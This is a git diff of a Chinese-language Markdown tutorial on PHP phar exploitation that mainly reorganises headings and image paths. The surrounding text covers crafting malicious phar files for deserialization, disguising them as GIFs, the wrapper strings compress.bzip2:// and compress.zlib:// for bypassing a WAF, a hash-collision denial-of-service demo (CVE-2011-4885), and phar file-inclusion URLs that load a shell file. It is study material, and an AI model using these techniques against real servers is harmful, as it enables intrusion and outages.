@@ -2,19 +2,20 @@
 
 ## 反序列化
 
-**参考**
+### 参考
 
 - https://blog.zsxsoft.com/post/38
 - https://paper.seebug.org/680/
 
-**利用条件**
+### 利用条件
 
 - phar文件要能够上传到服务器端。
 - 存在`__destruct`,`__wakeup`魔术方法作为跳板
 - 存在相关[函数](https://blog.zsxsoft.com/post/38)函数,并且参数可控，`:`、`/`、`phar`等特殊字符没有被过滤。
 
-**受影响的函数列表**
-![](/images/19-1-19_2018总结-PHP篇_利用类进行反序列化Phar1.png)
+### 受影响的函数列表
+
+![](../images/19-1-19_2018总结-PHP篇_利用类进行反序列化Phar1.png)
 对于函数影响范围的深入追求参看[zsx](https://blog.zsxsoft.com/post/38)师傅的文章，简单如下：
 
 - exif (exif_thumbnail、exif_imagetype)
@@ -49,17 +50,11 @@ $s = mysqli_real_connect($m, 'localhost', 'root', '123456', 'easyweb', 3306);
 $p = mysqli_query($m, 'LOAD DATA LOCAL INFILE \'phar://test.phar/test\' INTO TABLE a  LINES TERMINATED BY \'\r\n\'  IGNORE 1 LINES;');
 ```
 
-**phar://绕过**
-如果waf过滤了phar://，则可以使用：
-
-```
-compress.bzip2://phar://
-compress.zlib://
-```
-
 ### 利用
 
-**构造恶意phar包的php文件：**
+#### 测试
+
+##### 生成恶意phar代码
 
 ```php
 <?php
@@ -80,7 +75,7 @@ compress.zlib://
 
 其中`xxx<?php xxx; __HALT_COMPILER();?>`是phar文件的stub，可用理解为一个身份id。其中stub的内容必须以`__HALT_COMPILER();?>`结尾，否则phar扩展将无法识别这个文件为phar文件。具体参考[seebug](https://paper.seebug.org/680/)的文章。
 
-**phar反序列化已构造的恶意php文件**
+##### phar反序列化已构造的恶意php文件
 
 ```php
 <?php 
@@ -98,9 +93,20 @@ compress.zlib://
 ?>
 ```
 
-![](/images/19-7-13_Phar的文件包含与反序列化_反序列化_1.png)
+![](../images/19-7-13_Phar的文件包含与反序列化_反序列化_1.png)
 
-**phar文件可通过添加幻术伪造为其他类型的文件：**
+##### Bypass
+
+如果waf过滤了phar://，则可以使用：
+
+```
+compress.bzip2://phar://
+compress.zlib://
+```
+
+##### 伪造为其他类型的文件
+
+phar文件可通过添加幻术伪造为其他类型的文件
 
 ```php
 <?php
@@ -119,11 +125,13 @@ compress.zlib://
 ?>
 ```
 
-![](/images/19-7-23_PHP_Phar的文件包含与反序列化_反序列化_2.png)
+![](../images/19-7-23_PHP_Phar的文件包含与反序列化_反序列化_2.png)
 
-## 拒绝服务
+## 拒绝服务攻击
 
-**还可以利用来进行拒绝服务攻击(PHP内核哈希表碰撞攻击（CVE-2011-4885）)**
+### PHP内核哈希表碰撞攻击
+
+进行拒绝服务攻击(PHP内核哈希表碰撞攻击（CVE-2011-4885）)
 
 ```php
 <?php
@@ -140,7 +148,7 @@ $p['hacker.php'] = '<?php ?>';
 $p->setMetadata($new_obj);
 $p->setStub('GIF<?php __HALT_COMPILER();?>');
 ```
-**反序列化恶意文件**
+反序列化上文生成的恶意文件
 
 ```php
 <?php
@@ -151,20 +159,20 @@ $endTime = microtime(true);
 echo '执行时间：  '.($endTime - $startTime). ' 秒'; 
 ```
 
-![](/images/19-7-23_PHP_Phar的文件包含与反序列化_反序列化_3.png)
+![](../images/19-7-23_PHP_Phar的文件包含与反序列化_反序列化_3.png)
 
 ## 文件包含
 
-**利用范围**
+### 利用范围
 
 - PHP 5 >= 5.3.0、 PECL phar >= 1.0.0
 - PHP 7、 PECL phar >= 1.0.0
 
-**参考：**
+### 参考
 
 - https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/
 
-**测试代码**
+### 测试代码
 
 index.php
 
@@ -185,5 +193,6 @@ index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/shell.txt   //绝对�
 index.php?file=phar://test.zip/shell.txt   //相对路径
 ```
 
-![](/images/19-7-23_PHP_Phar的文件包含与反序列化_文件包含_1.png)
+![](../images/19-7-23_PHP_Phar的文件包含与反序列化_文件包含_1.png)
 
+### 
